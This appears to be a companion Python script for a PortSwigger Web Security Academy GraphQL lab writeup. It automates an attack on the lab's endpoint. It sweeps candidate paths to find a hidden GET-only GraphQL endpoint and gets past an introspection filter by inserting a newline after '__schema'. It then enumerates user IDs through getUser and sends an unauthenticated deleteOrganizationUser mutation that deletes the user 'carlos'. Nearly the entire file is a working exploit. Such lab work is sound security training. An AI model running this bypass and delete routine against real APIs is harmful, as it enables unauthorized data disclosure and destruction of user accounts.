#!/usr/bin/env python3
"""
Finding a hidden GraphQL endpoint
PortSwigger Web Security Academy -- GraphQL API vulnerabilities

Companion script for the writeup: 03-finding-a-hidden-graphql-endpoint.md

What this does:
    Sweeps an extended list of candidate GraphQL paths first as POST (all
    fail, since this endpoint only speaks GraphQL over GET), then re-sweeps
    the same list as GET to find /api. Introspection over GET comes back
    blocked by a literal "__schema{" substring filter, so it inserts a
    newline immediately after "__schema" -- syntactically ignored by the
    GraphQL parser, invisible to the naive filter -- which recovers the full
    schema (getUser(id: Int), deleteOrganizationUser(input: {id: Int})).
    It then finds carlos's numeric ID via getUser and fires the delete
    mutation over GET, since that's the only method this endpoint accepts
    and no authentication is required at any step.

Usage:
    python 03-finding-a-hidden-graphql-endpoint.py <lab-url>
    e.g. python 03-finding-a-hidden-graphql-endpoint.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import sys
import httpx

CANDIDATE_PATHS = [
    "/graphql", "/api", "/api/graphql", "/graphql/api",
    "/graphql/graphql", "/graphql/v1", "/api/v1/graphql",
    "/gql", "/query", "/v1/graphql", "/v2/graphql",
    "/graphiql", "/playground", "/console",
]

FULL_INTROSPECTION_QUERY = (
    "query IntrospectionQuery { __schema { queryType { name } mutationType "
    "{ name } subscriptionType { name } types { ...FullType } directives "
    "{ name description args { ...InputValue } } } } "
    "fragment FullType on __Type { kind name description "
    "fields(includeDeprecated: true) { name description args { ...InputValue } "
    "type { ...TypeRef } isDeprecated deprecationReason } inputFields "
    "{ ...InputValue } interfaces { ...TypeRef } "
    "enumValues(includeDeprecated: true) { name description isDeprecated "
    "deprecationReason } possibleTypes { ...TypeRef } } "
    "fragment InputValue on __InputValue { name description type { ...TypeRef } "
    "defaultValue } "
    "fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name "
    "ofType { kind name } } } }"
)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    print("[*] Sweeping candidate paths as POST /path {\"query\": \"{__typename}\"} ...")
    for path in CANDIDATE_PATHS:
        r = client.post(f"{lab_url}{path}", json={"query": "{__typename}"})
        if r.status_code == 200 and "__typename" in r.text:
            print(f"[!] Unexpected -- POST worked at {path}, this lab is supposed to be GET-only")

    print("[*] No POST responses matched -- sweeping the same paths as GET ?query=... instead.")
    endpoint = None
    for path in CANDIDATE_PATHS:
        r = client.get(f"{lab_url}{path}", params={"query": "{__typename}"})
        if r.status_code == 200 and "__typename" in r.text:
            endpoint = f"{lab_url}{path}"
            print(f"[+] GraphQL endpoint found: GET {endpoint}")
            break

    if not endpoint:
        print("[-] No GraphQL endpoint found.")
        return

    print("[*] Probing standard introspection...")
    r = client.get(endpoint, params={"query": FULL_INTROSPECTION_QUERY})
    if "__schema" in FULL_INTROSPECTION_QUERY and "not allowed" in r.text.lower():
        print(f"[*] Introspection blocked: {r.text[:150]}")
        print("[*] Filter matches the literal substring \"__schema{\" -- inserting a newline after __schema.")
        bypass_query = FULL_INTROSPECTION_QUERY.replace("__schema {", "__schema\n{")
        r = client.get(endpoint, params={"query": bypass_query})

    try:
        schema_data = r.json()["data"]["__schema"]
    except Exception:
        print(f"[-] Could not recover the schema even with the newline bypass: {r.text[:300]}")
        return

    type_names = [t["name"] for t in schema_data.get("types", []) if not t["name"].startswith("__")]
    print(f"[+] Introspection bypass worked. Types discovered: {', '.join(type_names)}")

    print("[*] Enumerating getUser(id: N) to find carlos's numeric ID...")
    carlos_id = None
    for uid in range(1, 10):
        query = f"{{ getUser(id: {uid}) {{ id username }} }}"
        r = client.get(endpoint, params={"query": query})
        try:
            user = r.json().get("data", {}).get("getUser")
        except Exception:
            continue
        if user and user.get("username") == "carlos":
            carlos_id = user["id"]
            print(f"[+] carlos found at id: {carlos_id}")
            break

    if carlos_id is None:
        print("[-] Could not locate carlos via getUser.")
        return

    delete_query = f"mutation {{ deleteOrganizationUser(input: {{ id: {carlos_id} }}) {{ user {{ id }} }} }}"
    r = client.get(endpoint, params={"query": delete_query})
    print(f"[*] Delete mutation sent over GET, status={r.status_code}, body={r.text[:200]}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- carlos deleted via the unauthenticated GET mutation.")
    else:
        print("[-] Not solved yet -- check the delete mutation response for errors.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
